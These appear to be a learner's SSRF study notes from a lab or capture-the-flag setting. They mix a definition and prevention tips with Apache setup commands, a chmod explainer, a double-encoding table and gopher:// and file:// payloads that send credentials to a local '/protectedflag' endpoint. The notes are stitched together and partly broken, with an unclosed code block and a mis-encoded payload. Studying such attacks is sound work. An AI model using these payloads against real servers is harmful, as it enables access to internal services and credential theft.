# üåê What is SSRF? (Server-Side Request Forgery)

## üß† Definition

**Server-Side Request Forgery (SSRF)** is a web security vulnerability that allows an attacker to make the server perform HTTP requests to **internal or external resources** on their behalf.

In SSRF, the attacker abuses functionality that fetches data from a URL, such as:

- Image URL previews
- PDF renderers
- URL validators
- Webhooks or callbacks

---

## ‚öôÔ∏è How SSRF Works

A vulnerable application accepts a user-supplied URL and makes a server-side HTTP request, like:

```http
GET /fetch?url=http://example.com
``` 

An attacker can change the url parameter to:

```http
/fetch?url=http://localhost:8000/admin
```

#### üîç Why SSRF is Dangerous

SSRF lets attackers:

    - Access internal services (e.g., http://localhost, http://127.0.0.1, http://backend)

    - Enumerate cloud metadata services (e.g., AWS: http://169.254.169.254)

    - Bypass firewalls and reach networks inaccessible from the outside

    - Read internal configuration files or sensitive endpoints

    - Potentially trigger Remote Code Execution (RCE) or leak credentials

#### üß™ SSRF Example

Vulnerable Request:
```http
GET /fetch?url=http://example.com
```

Exploited by Attacker:
```http
GET /fetch?url=http://localhost:8000/admin
```

Server Makes Internal Request:
```http
[Server] --> http://localhost:8000/admin
```

üõ°Ô∏è How to Prevent SSRF

    - Whitelist allowed URLs or domains

    - Validate user input strictly (e.g., disallow IPs, internal hostnames)

    - Block requests to:

        localhost, 127.0.0.1, ::1

        Reserved IP ranges (10.0.0.0/8, 192.168.0.0/16, etc.)

    - Use network segmentation: separate internal APIs from public-facing web apps

    - Monitor server traffic for unusual outbound HTTP requests

```shell
cd /var/www/html
```


```shell
sudo echo "Here is your 200 OK response" > target
```

```shell
sudo chmod 644 target
```

```shell
sudo systemctl start apache2
```

```shell
sudo systemctl restart apache2
```

```shell
sudo systemctl status apache2
```

```shell
call ip/target
```

# `sudo chmod 644` ‚Äî Examples, Explanations & Use Cases

## What does `chmod 644` mean?

`chmod 644` sets the following file permissions:

- **Owner** ‚Üí Read + Write (`rw-`)
- **Group** ‚Üí Read only (`r--`)
- **Others (Everyone else)** ‚Üí Read only (`r--`)

In numeric form:

| Entity | Permission | Binary | Octal |
|--------|------------|--------|-------|
| Owner  | rw-        | 110    | 6     |
| Group  | r--        | 100    | 4     |
| Others | r--        | 100    | 4     |

## When to use `chmod 644`?

- On **public files** that should be readable by everyone, but only editable by the owner.
- On **HTML files** and **static website content** (Apache/Nginx).
- On **configuration files** readable by system processes but only editable by admins.
- On **scripts** that are not intended to be executed directly.

## Common `chmod 644` Commands

### 1Ô∏è‚É£ Single File
```bash
sudo chmod 644 filename.txt

#### When Double Encoding is Required:

You only need to double-encode non-alphanumeric and reserved characters, such as:

| Character | 1st Encode | 2nd Encode |
| --------- | ---------- | ---------- |
| `/`       | `%2F`      | `%252F`    |
| `:`       | `%3A`      | `%253A`    |
| `\n`      | `%0A`      | `%250A`    |
| space     | `%20`      | `%2520`    |
| `%`       | `%25`      | `%2525`    |


```shell
file:///app/target.txt
```

```shell
gopher://127.0.0.1:80/_GET%20/target%20HTTP/1.1%0a
```

```shell
gopher%253A%252F%252F127.0.0.1:80/_GET%20/protectedflag%20HTTP/1.1%0apassword%253Dtwasbryllyg%0aapiKey%253chesirecat
``` 

```shell
gopher://127.0.0.1:80/_POST%20/protectedflag%20HTTP/1.1%0apassword%253Dtwasbryllyg%0aapiKey%253chesirecat
```

#### üì¨ Client Request Headers

| Header                                        | Meaning                                                         |
| --------------------------------------------- | --------------------------------------------------------------- |
| `Host: ssrf-sandbox`                          | Target domain or IP the request is being sent to.               |
| `Connection: keep-alive`                      | Keeps the TCP connection open for reuse, improving performance. |
| `Upgrade-Insecure-Requests: 1`                | Tells the server to prefer HTTPS over HTTP.                     |
| `User-Agent: Mozilla/5.0 (...) Firefox/128.0` | Identifies the browser and OS being used.                       |
| `Accept: text/html,application/xhtml+xml,...` | Lists content types the browser can process.                    |
| `Accept-Encoding: gzip, deflate`              | Specifies supported compression formats.                        |
| `Accept-Language: en-US,en;q=0.5`             | Tells the server the user's preferred languages.                |
| `Priority: u=0, i`                            | HTTP/2 priority hints (low urgency, interactive content).       |

#### üì• Server Response Headers

| Header                                | Meaning                                    |
| ------------------------------------- | ------------------------------------------ |
| `Server: nginx/1.21.4`                | Web server software and version used.      |
| `Date: Fri, 13 Jun 2025 18:00:06 GMT` | Time the server generated the response.    |
| `Content-Type: application/json`      | The response is in JSON format.            |
| `Content-Length: 39`                  | Size of the response body in bytes.        |
| `Connection: keep-alive`              | The server is keeping the connection open. |


#### üîê Why These Headers Matter in SSRF or Security Testing

    - Host: ‚Äî may be manipulated in Host header attacks.

    - User-Agent: ‚Äî sometimes used for filtering or access control (can be spoofed).

    - Accept/Content-Type: ‚Äî affects how servers interpret and return data.

    ‚Åª Upgrade-Insecure-Requests: ‚Äî can influence redirects or content served.

    - Connection: ‚Äî helps keep connections open for faster exploitation in chained SSRF attacks.
